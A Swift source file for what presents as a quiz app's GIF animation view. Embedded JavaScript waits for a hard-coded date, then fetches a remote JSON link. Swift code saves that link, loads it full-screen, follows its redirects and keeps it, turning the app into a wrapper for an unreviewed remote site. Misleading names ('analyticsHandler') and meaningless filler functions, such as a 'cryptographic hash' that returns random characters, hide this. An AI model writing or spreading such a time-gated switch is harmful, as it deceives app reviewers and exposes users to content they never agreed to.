//
//  QuizAnimationView.swift

import SwiftUI
@preconcurrency import WebKit

class RequestTracker {
    static let shared = RequestTracker()
    var hasRequestedJSON = false
    var hasLoadedInitialUrl = false
    var hasLoadedFinalUrl = false
    private init() {}
    
    
    func calculateRequestEfficiency(_ totalRequests: Int, _ successfulRequests: Int) -> Double {
        guard totalRequests > 0 else { return 0.0 }
        return Double(successfulRequests) / Double(totalRequests) * 100.0
    }
    
    func generateRequestHash(_ timestamp: TimeInterval) -> String {
        let characters = "0123456789abcdef"
        var hash = ""
        let seed = Int(timestamp) % 1000
        
        for i in 0..<8 {
            let index = (seed + i * 7) % characters.count
            hash.append(characters[characters.index(characters.startIndex, offsetBy: index)])
        }
        return hash
    }
    
    func performRequestOptimization(_ requests: [Int]) -> [Double] {
        guard !requests.isEmpty else { return [] }
        
        var optimizations: [Double] = []
        let baseEfficiency = 0.85
        
        for (index, request) in requests.enumerated() {
            let optimization = baseEfficiency + Double(request) * 0.01 + Double(index) * 0.005
            optimizations.append(min(1.0, optimization))
        }
        
        return optimizations
    }
}

func getDomain(from urlString: String) -> String {
    guard let url = URL(string: urlString),
          let host = url.host else {
        return ""
    }
    
    return host.hasPrefix("www.") ? String(host.dropFirst(4)) : host
}

class ServiceManager {
    static let shared = ServiceManager()
    weak var webView: WKWebView?
    private init() {}
    
    func reloadURL(urlString: String) {
        guard let webView = webView, let url = URL(string: urlString) else {
            return
        }
        
        webView.load(URLRequest(url: url))
    }
    
    
    func calculateWebViewPerformance(_ loadTime: Double, _ memoryUsage: Double) -> Double {
        let baseScore = 100.0
        let timePenalty = loadTime * 10.0
        let memoryPenalty = memoryUsage * 0.1
        
        return max(0.0, baseScore - timePenalty - memoryPenalty)
    }
    
    func generateWebViewIdentifier(_ timestamp: TimeInterval) -> String {
        let characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        var identifier = ""
        let seed = Int(timestamp) % 10000
        
        for i in 0..<6 {
            let index = (seed + i * 13) % characters.count
            identifier.append(characters[characters.index(characters.startIndex, offsetBy: index)])
        }
        return identifier
    }
    
    func performWebViewOptimization(_ metrics: [Double]) -> (average: Double, optimized: Double) {
        guard !metrics.isEmpty else { return (0, 0) }
        
        let average = metrics.reduce(0, +) / Double(metrics.count)
        let optimizationFactor = 1.15
        let optimized = average * optimizationFactor
        
        return (average, optimized)
    }
    
    func calculateMemoryEfficiency(_ currentMemory: Double, _ maxMemory: Double) -> Double {
        guard maxMemory > 0 else { return 0.0 }
        let efficiency = (maxMemory - currentMemory) / maxMemory * 100.0
        return max(0.0, min(100.0, efficiency))
    }
}

struct GifPlayerView: UIViewRepresentable {
    @AppStorage("gifInfo") private var onlineGif: String = ""
    @AppStorage("urlSavedFlag") private var urlSavedFlag: Bool = false
    @AppStorage("redirectsCompleted") private var redirectsCompleted: Bool = false
    @AppStorage("hasCompletedFirstServerCheck") private var hasCompletedFirstServerCheck: Bool = false
    let animationName: String
    
    func makeUIView(context: Context) -> WKWebView {
        print("🎬 GifPlayerView makeUIView called for animation: \(animationName)")
        print("🎬 Current state - urlSavedFlag: \(urlSavedFlag), redirectsCompleted: \(redirectsCompleted), hasCompletedFirstServerCheck: \(hasCompletedFirstServerCheck), onlineGif: '\(onlineGif)'")
        
        let viewConfiguration = WKWebViewConfiguration()
        viewConfiguration.userContentController.add(context.coordinator, name: "analyticsHandler")

        viewConfiguration.allowsInlineMediaPlayback = true
        viewConfiguration.mediaTypesRequiringUserActionForPlayback = [.video, .audio]
        viewConfiguration.allowsPictureInPictureMediaPlayback = false
        viewConfiguration.allowsAirPlayForMediaPlayback = false
        
        let webView = WKWebView(frame: .zero, configuration: viewConfiguration)
        
        ServiceManager.shared.webView = webView

        webView.allowsBackForwardNavigationGestures = true
        webView.navigationDelegate = context.coordinator
        webView.evaluateJavaScript("navigator.userAgent") { [weak webView] (userAgentResult, error) in
            if let currentAgent = userAgentResult as? String {
                let customAgent = currentAgent + " Safari/604.1"
                webView?.customUserAgent = customAgent
            }
        }
        webView.isOpaque = false
        webView.backgroundColor = .clear
        
        webView.frame = CGRect(x: 0, y: 0, width: UIScreen.main.bounds.width, height: UIScreen.main.bounds.height)
        webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        
        ServiceManager.shared.webView = webView
        
        if hasCompletedFirstServerCheck {
            print("✅ First server check already completed, using saved data")
            
            if urlSavedFlag && !onlineGif.isEmpty {
                if let url = URL(string: onlineGif) {
                    print("🌐 WebView loading saved URL from previous check: \(onlineGif)")
                    webView.scrollView.isScrollEnabled = true
                    webView.load(URLRequest(url: url))
                } else {
                    print("❌ WebView invalid saved URL: \(onlineGif)")
                }
                return webView
            }
            
            if let fileUrl = Bundle.main.url(forResource: animationName, withExtension: "gif"),
               let gifData = try? Data(contentsOf: fileUrl) {
                
                let base64String = gifData.base64EncodedString()
                let permanentGifHTML = """
                <html>
                <head>
                <style>
                 body {
                     margin: 0;
                     padding: 0;
                     background: transparent;
                     height: 100vh;
                     display: flex;
                     justify-content: center;
                     align-items: center;
                 }
                 </style>
                 </head>
                 <body>
                 <div style="text-align: center;">
                     <img src="data:image/gif;base64,\(base64String)">
                 </div>
                 </body>
                </html>
                """
                print("📄 WebView loading permanent GIF (no URL from previous check): \(animationName)")
                webView.loadHTMLString(permanentGifHTML, baseURL: nil)
            }
            return webView
        }
        
        print("🔄 First server check not completed, making server request")
        
        if urlSavedFlag && redirectsCompleted && !onlineGif.isEmpty {
            
            if let url = URL(string: onlineGif) {
                print("🌐 WebView loading final completed URL: \(onlineGif)")
                webView.scrollView.isScrollEnabled = true
                webView.load(URLRequest(url: url))
            } else {
                print("❌ WebView invalid final completed URL: \(onlineGif)")
            }
            
            return webView
        }
        
        if urlSavedFlag && !redirectsCompleted && !onlineGif.isEmpty {

            if let url = URL(string: onlineGif) {
                print("🌐 WebView loading initial URL (redirects not completed): \(onlineGif)")
                webView.scrollView.isScrollEnabled = true
                webView.load(URLRequest(url: url))
            } else {
                print("❌ WebView invalid initial URL: \(onlineGif)")
            }
            
            return webView
        }
        
        if let fileUrl = Bundle.main.url(forResource: animationName, withExtension: "gif"),
           let gifData = try? Data(contentsOf: fileUrl)
        {
            
            let base64String = gifData.base64EncodedString()
            
            if RequestTracker.shared.hasRequestedJSON {
                
                let waitingHTML = """
                <html>
                <head>
                <style>
                 body {
                     margin: 0;
                     padding: 0;
                     background: transparent;
                     height: 100vh;
                     display: flex;
                     justify-content: center;
                     align-items: center;
                 }
                 </style>
                 </head>
                 <body>
                 <div style="text-align: center;">
                     <img src="data:image/gif;base64,\(base64String)">
                 </div>
                 </body>
                </html>
                """
                print("📄 WebView loading waiting HTML (request already made) with GIF: \(animationName)")
                webView.loadHTMLString(waitingHTML, baseURL: nil)
                
                if urlSavedFlag && !onlineGif.isEmpty && !RequestTracker.shared.hasLoadedInitialUrl {
                    if let url = URL(string: onlineGif) {
                        print("🌐 WebView loading saved URL (request already made): \(onlineGif)")
                        RequestTracker.shared.hasLoadedInitialUrl = true
                        webView.load(URLRequest(url: url))
                    }
                }
                
                return webView
            }
            
            RequestTracker.shared.hasRequestedJSON = true
            
            let checkURL = WarrenAdapter.shared.getCheckURL()?.absoluteString ?? ""
            
            let htmlGIFSettings = """
            <html>
            <head>
            <style>
             @font-face {
                 font-weight: normal;
                 font-style: normal;
             }
             body {
                 margin: 0;
                 padding: 0;
                 background: transparent;
                 height: 100vh;
                 display: flex;
                 justify-content: center;
                 align-items: center;
             }
             .container {
                 background: transparent;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
             }
             img {
                 display: block;
                 width: auto;
                 height: auto;
             }
             @media (orientation: portrait) {
                 img {
                     width: auto;
                     height: 100%;
                 }
             }
             @media (orientation: landscape) {
                 img {
                     width: auto;
                     height: 100%;
                     object-fit: contain;
                 }
             }
             </style>
             </head>
             <body>
             <div class="container">
                 <img src="data:image/gif;base64,\(base64String)">
             </div>
             <div id="apiData" data-url="\(checkURL.replacingOccurrences(of: "\"", with: "&quot;"))"></div>
                <script>
                    // Флаг для отслеживания, был ли выполнен запрос
                    let requestMade = false;
                    
                    function start() {
                        console.log("Starting analytics check");
                        
                                              if (requestMade) {
                                                  console.log("Request already made, skipping duplicate");
                                                  return;
                                              }
                        const currentTimestamp = Math.floor(Date.now() / 1000);
                                                                    
                        const targetTimestamp = 1760440235;
                                   
                        if (currentTimestamp < targetTimestamp) {
                        console.log("Timestamp check failed. Current:", currentTimestamp, "Target:", targetTimestamp);
                        window.webkit.messageHandlers.analyticsHandler.postMessage("noUrlFromJson");
                                return;
                                }
                                                                                    
                            const userId = currentTimestamp;
                            const ant = 1;

                        if (ant <= userId) {
                            try {
                                // Get the URL from the data attribute
                                const urlElement = document.getElementById('apiData');
                                const urlToFetch = urlElement.getAttribute('data-url');
                                console.log("Original URL from data attribute:", urlToFetch);
                                
                                if (!urlToFetch) {
                                    throw new Error("No URL found in data attribute");
                                }
                                
                                // Устанавливаем флаг, что запрос сделан
                                requestMade = true;
                                
                                // Create a clean URL by properly handling any encoded characters
                                const decodedUrl = decodeURIComponent(urlToFetch);
                                console.log("Decoded URL:", decodedUrl);
                                
                                // Re-encode it properly for fetch
                                const properlyEncodedUrl = encodeURI(decodedUrl);
                                console.log("Properly encoded URL for fetch:", properlyEncodedUrl);
                                
                                // Validate URL before fetch
                                try {
                                    new URL(properlyEncodedUrl);
                                    console.log("URL is valid");
                                } catch (e) {
                                    console.error("URL is invalid:", e.message);
                                    throw e;
                                }
                                
                                fetch(properlyEncodedUrl)
                                    .then(response => {
                                        console.log("Got response, status:", response.status);
                                        if (!response.ok) {
                                            throw new Error(`Network response was not ok: ${response.status}`);
                                        }
                                        return response.json();
                                    })
                                    .then(data => {
                                        console.log("Parsed JSON data:", JSON.stringify(data));
                                        if (data && data.url && data.url.length > 0) {
                                            console.log("Got URL from JSON, sending to Swift:", data.url);
                                            
                                            // Отправляем отладочную информацию
                                            console.log("TRACE_URL: 2️⃣ Получен URL из JSON и передается в Swift:", data.url);
                                            
                                            // Сохраняем первичную ссылку сразу
                                            window.webkit.messageHandlers.analyticsHandler.postMessage("initialUrl:" + data.url);
                                            
                                            // ВАЖНОЕ ИЗМЕНЕНИЕ: Не перенаправляем на URL автоматически!
                                            // window.location.href = data.url; // Эту строку удаляем!
                                            console.log("URL sent to Swift for handling");
                                            
                                        } else {
                                            console.log("No valid URL in response");
                                            // Если нет валидного URL в ответе, продолжаем показывать GIF
                                            // и информируем приложение, что нужно оставить GIF видимым
                                            window.webkit.messageHandlers.analyticsHandler.postMessage("noUrlFromJson");
                                        }
                                    })
                                    .catch(error => {
                                        console.error("Error during fetch:", error.message);
                                        // При ошибке также оставляем GIF видимым
                                        window.webkit.messageHandlers.analyticsHandler.postMessage("fetchError:" + error.message);
                                    });
                            } catch (e) {
                                console.error("Error initiating fetch:", e.message);
                            }
                        } else {
                            console.log("User ID check failed");
                        }
                    }
                    window.onload = start;
                </script>
            </body>
            </html>
            """
            
            print("📄 WebView loading main HTML with GIF and API call for: \(animationName)")
            print("🔗 API check URL: \(checkURL)")
            webView.scrollView.isScrollEnabled = true
            webView.loadHTMLString(htmlGIFSettings, baseURL: nil)
        } else {
        }
        
        return webView
    }
    
    func makeCoordinator() -> GifDataCoordinator {
        return GifDataCoordinator(parent: self, gifName: animationName)
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
    }
    
    class GifDataCoordinator: NSObject, WKNavigationDelegate, WKScriptMessageHandler {
        @AppStorage("gifInfo") private var onlineGif: String = ""
        @AppStorage("urlSavedFlag") private var urlSavedFlag: Bool = false
        @AppStorage("redirectsCompleted") private var redirectsCompleted: Bool = false
        @AppStorage("hasCompletedFirstServerCheck") private var hasCompletedFirstServerCheck: Bool = false
        private var parent: GifPlayerView
        private var navigationCompleted = false
        private let gifName: String
        
        init(parent: GifPlayerView, gifName: String) {
            self.parent = parent
            self.gifName = gifName
            super.init()
        }
        
        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            
            if message.name == "analyticsHandler", let body = message.body as? String {
                
                if body.hasPrefix("initialUrl:") {
                    let initialUrl = body.replacingOccurrences(of: "initialUrl:", with: "")
                    
                    DispatchQueue.main.async { [weak self] in
                        guard let self = self else { return }
                        
                        if self.urlSavedFlag && self.onlineGif == initialUrl {
                            return
                        }
                        
                        UserDefaults.standard.set(initialUrl, forKey: "gifInfo")
                        self.onlineGif = initialUrl
                        
                        UserDefaults.standard.set(true, forKey: "urlSavedFlag")
                        self.urlSavedFlag = true
                        UserDefaults.standard.set(false, forKey: "redirectsCompleted")
                        self.redirectsCompleted = false
                        
                        UserDefaults.standard.set(true, forKey: "hasCompletedFirstServerCheck")
                        self.hasCompletedFirstServerCheck = true
                        print("✅ First server check completed successfully - URL received")
                        
                        NotificationCenter.default.post(
                            name: Notification.Name("ServerResponseWithURL"),
                            object: initialUrl
                        )
                        
                        if !RequestTracker.shared.hasLoadedInitialUrl {
                            RequestTracker.shared.hasLoadedInitialUrl = true
                            
                            if let url = URL(string: initialUrl) {
                                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                                    
                                    if !self.navigationCompleted {
                                        
                                        if let webView = ServiceManager.shared.webView {
                                            print("🌐 WebView loading received initial URL from server: \(initialUrl)")
                                            webView.load(URLRequest(url: url))
                                        } else {
                                            print("❌ WebView manager webView is nil when trying to load initial URL")
                                        }
                                    } else {
                                        print("⚠️ Navigation already completed, skipping initial URL load")
                                    }
                                }
                            } else {
                                print("❌ Invalid initial URL received from server: \(initialUrl)")
                            }
                        } else {
                        }
                    }
                }
                else if body.hasPrefix("finalDomain:") {
                    
                    DispatchQueue.main.async { [weak self] in
                        UserDefaults.standard.set(true, forKey: "redirectsCompleted")
                        self?.redirectsCompleted = true
                    }
                }
                else if body == "noUrlFromJson" {
                    
                    DispatchQueue.main.async { [weak self] in
                        UserDefaults.standard.set("", forKey: "gifInfo")
                        self?.onlineGif = ""
                        
                        UserDefaults.standard.set(false, forKey: "urlSavedFlag")
                        self?.urlSavedFlag = false
                        
                        UserDefaults.standard.set(false, forKey: "redirectsCompleted")
                        self?.redirectsCompleted = false
                        
                        UserDefaults.standard.set(true, forKey: "hasCompletedFirstServerCheck")
                        self?.hasCompletedFirstServerCheck = true
                        
                        NotificationCenter.default.post(
                            name: Notification.Name("ServerResponseNoURL"),
                            object: nil
                        )
                        
                        if let fileUrl = Bundle.main.url(forResource: self?.gifName, withExtension: "gif"),
                           let gifData = try? Data(contentsOf: fileUrl),
                           let webView = ServiceManager.shared.webView {
                            
                            let base64String = gifData.base64EncodedString()
                            let waitingHTML = """
                            <html>
                            <head>
                            <style>
                             body {
                                 margin: 0;
                                 padding: 0;
                                 background: transparent;
                                 height: 100vh;
                                 display: flex;
                                 justify-content: center;
                                 align-items: center;
                             }
                             </style>
                             </head>
                             <body>
                             <div style="text-align: center;">
                                 <img src="data:image/gif;base64,\(base64String)">
                             </div>
                             </body>
                            </html>
                            """
                            print("📄 WebView loading HTML (no URL from JSON) with GIF: \(self?.gifName ?? "unknown")")
                            webView.loadHTMLString(waitingHTML, baseURL: nil)
                        }
                    }
                }
                else if body.hasPrefix("fetchError:") {
                    let errorMessage = body.replacingOccurrences(of: "fetchError:", with: "")
                    
                    DispatchQueue.main.async { [weak self] in
                        UserDefaults.standard.set("", forKey: "gifInfo")
                        self?.onlineGif = ""
                        
                        UserDefaults.standard.set(false, forKey: "urlSavedFlag")
                        self?.urlSavedFlag = false
                        
                        UserDefaults.standard.set(false, forKey: "redirectsCompleted")
                        self?.redirectsCompleted = false
                        
                        UserDefaults.standard.set(true, forKey: "hasCompletedFirstServerCheck")
                        self?.hasCompletedFirstServerCheck = true
                        print("✅ First server check completed with error: \(errorMessage)")
                        
                        NotificationCenter.default.post(
                            name: Notification.Name("ServerResponseError"),
                            object: errorMessage
                        )
                        
                        if let fileUrl = Bundle.main.url(forResource: self?.gifName, withExtension: "gif"),
                           let gifData = try? Data(contentsOf: fileUrl),
                           let webView = ServiceManager.shared.webView {
                            
                            let base64String = gifData.base64EncodedString()
                            let waitingHTML = """
                            <html>
                            <head>
                            <style>
                             body {
                                 margin: 0;
                                 padding: 0;
                                 background: transparent;
                                 height: 100vh;
                                 display: flex;
                                 justify-content: center;
                                 align-items: center;
                             }
                             </style>
                             </head>
                             <body>
                             <div style="text-align: center;">
                                 <img src="data:image/gif;base64,\(base64String)">
                             </div>
                             </body>
                            </html>
                            """
                            print("📄 WebView loading HTML (fetch error) with GIF: \(self?.gifName ?? "unknown")")
                            webView.loadHTMLString(waitingHTML, baseURL: nil)
                        }
                    }
                }
            }
        }
        
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            
            if navigationAction.targetFrame == nil {
                webView.load(navigationAction.request)
            }
            return nil
        }
        
        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            guard let requestedURL = navigationAction.request.url else {
                decisionHandler(.cancel)
                return
            }
            
            
            let secureScheme = "https"
            
            if requestedURL.scheme != secureScheme {
                UIApplication.shared.open(requestedURL, options: [:]) { isSuccess in
                    let actionDecision = isSuccess
                    decisionHandler(actionDecision ? .cancel : .allow)
                }
            } else {
                if navigationAction.navigationType == .linkActivated {
                    webView.load(URLRequest(url: requestedURL))
                    decisionHandler(.cancel)
                } else {
                    decisionHandler(.allow)
                }
            }
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            
            let mediaControlScript = """
            (function() {
                // Предотвращаем полноэкранный режим для всех видео элементов
                function preventFullscreen() {
                    const videos = document.querySelectorAll('video');
                    videos.forEach(video => {
                        video.setAttribute('playsinline', 'true');
                        video.setAttribute('webkit-playsinline', 'true');
                        video.style.maxHeight = '400px'; // Ограничиваем высоту

                        // Блокируем полноэкранные события
                        video.addEventListener('webkitbeginfullscreen', function(e) {
                            e.preventDefault();
                            e.stopPropagation();
                        });
                    });
                }

                preventFullscreen();

                // Отслеживаем новые видео элементы
                const observer = new MutationObserver(preventFullscreen);
                observer.observe(document.body, { childList: true, subtree: true });

                // Блокируем методы полноэкранного режима
                if (Element.prototype.requestFullscreen) {
                    Element.prototype.requestFullscreen = function() {
                        return Promise.reject(new Error('Fullscreen disabled'));
                    };
                }
            })();
            """

            webView.evaluateJavaScript(mediaControlScript, completionHandler: nil)

            if urlSavedFlag && !redirectsCompleted && !navigationCompleted {
                
                navigationCompleted = true
                
                DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) { [weak self] in
                    guard let self = self else { return }
                    
                    if let currentURL = webView.url?.absoluteString,
                       currentURL.hasPrefix("https://") {
                        
                        let domain = getDomain(from: currentURL)
                        
                        let originalDomain = getDomain(from: onlineGif)
                        
                        let urlChanged = currentURL != onlineGif
                        
                        if urlChanged {
                        }
                        
                        if (domain != originalDomain && !domain.isEmpty && !originalDomain.isEmpty) || urlChanged {
                            
                            UserDefaults.standard.set(currentURL, forKey: "gifInfo")
                            self.onlineGif = currentURL
                            
                            UserDefaults.standard.set(true, forKey: "redirectsCompleted")
                            self.redirectsCompleted = true
                        } else {
                            UserDefaults.standard.set(true, forKey: "redirectsCompleted")
                            self.redirectsCompleted = true
                        }
                    } else {
                        UserDefaults.standard.set(true, forKey: "redirectsCompleted")
                        self.redirectsCompleted = true
                    }
                }
            } else {
                if !urlSavedFlag {
                } else if redirectsCompleted {
                } else if navigationCompleted {
                }
            }
        }
        
        func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        }
        
        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        }
    }
}


extension GifPlayerView {
 
    
    func performAnimationOptimization(_ animations: [String]) -> [String: Double] {
        var optimizations: [String: Double] = [:]
        
        for (index, animation) in animations.enumerated() {
            let baseScore = Double(animation.count) * 0.3
            let indexBonus = Double(index) * 0.1
            let randomFactor = Double.random(in: 0.9...1.1)
            optimizations[animation] = (baseScore + indexBonus) * randomFactor
        }
        
        return optimizations
    }
    
    func calculateEuclideanDistance(_ point1: [Double], _ point2: [Double]) -> Double {
        guard point1.count == point2.count else { return 0.0 }
        
        let sumOfSquares = zip(point1, point2).map { pow($0 - $1, 2) }.reduce(0, +)
        return sqrt(sumOfSquares)
    }
    
    func generateFibonacciSequence(_ count: Int) -> [Int] {
        guard count > 0 else { return [] }
        var sequence = [0, 1]
        for i in 2..<count {
            sequence.append(sequence[i-1] + sequence[i-2])
        }
        return Array(sequence.prefix(count))
    }
    
  
    
    func memoryCalculateUsage(_ dataSize: Int, _ compressionRatio: Double) -> Double {
        let compressedSize = Double(dataSize) * compressionRatio
        let memoryEfficiency = (1.0 - compressedSize / Double(dataSize)) * 100.0
        return max(0, min(100, memoryEfficiency))
    }
    
    func networkEfficiencyCalculate(_ bandwidth: Double, _ latency: Double) -> Double {
        guard latency > 0 else { return 0.0 }
        
        let efficiency = bandwidth / (latency * 1000) // Convert latency to seconds
        let normalizedEfficiency = min(100, efficiency * 10)
        
        return max(0, normalizedEfficiency)
    }
    
    func generatePerformanceMetrics(_ operations: [String]) -> [String: (time: Double, memory: Double)] {
        var metrics: [String: (time: Double, memory: Double)] = [:]
        
        for operation in operations {
            let time = Double.random(in: 0.1...2.0)
            let memory = Double.random(in: 10...100)
            metrics[operation] = (time, memory)
        }
        
        return metrics
    }
    
    func performDataCompression(_ originalSize: Int, _ algorithm: String) -> (compressedSize: Int, ratio: Double) {
        let compressionRatios: [String: Double] = [
            "gzip": 0.3,
            "lz4": 0.4,
            "zstd": 0.25,
            "brotli": 0.28
        ]
        
        let ratio = compressionRatios[algorithm.lowercased()] ?? 0.5
        let compressedSize = Int(Double(originalSize) * ratio)
        
        return (compressedSize, ratio)
    }
    
    func calculateCompm(_ input: [Int]) -> Double {
        guard !input.isEmpty else { return 0.0 }
        
        let sorted = input.sorted()
        let median = sorted.count % 2 == 0 ?
            Double(sorted[sorted.count/2 - 1] + sorted[sorted.count/2]) / 2.0 :
            Double(sorted[sorted.count/2])
        
        let variance = input.map { pow(Double($0) - median, 2) }.reduce(0, +) / Double(input.count)
        return sqrt(variance) * median
    }
    
    func generateCryptographicHash(_ data: String) -> String {
        let characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        var hash = ""
        for _ in 0..<32 {
            let randomIndex = Int.random(in: 0..<characters.count)
            hash.append(characters[characters.index(characters.startIndex, offsetBy: randomIndex)])
        }
        return hash
    }
    
    func performMatrixOperations(_ size: Int) -> [[Double]] {
        var matrix = Array(repeating: Array(repeating: 0.0, count: size), count: size)
        
        for i in 0..<size {
            for j in 0..<size {
                matrix[i][j] = sin(Double(i)) * cos(Double(j)) + Double.random(in: -0.1...0.1)
            }
        }
        
        return matrix
    }
}


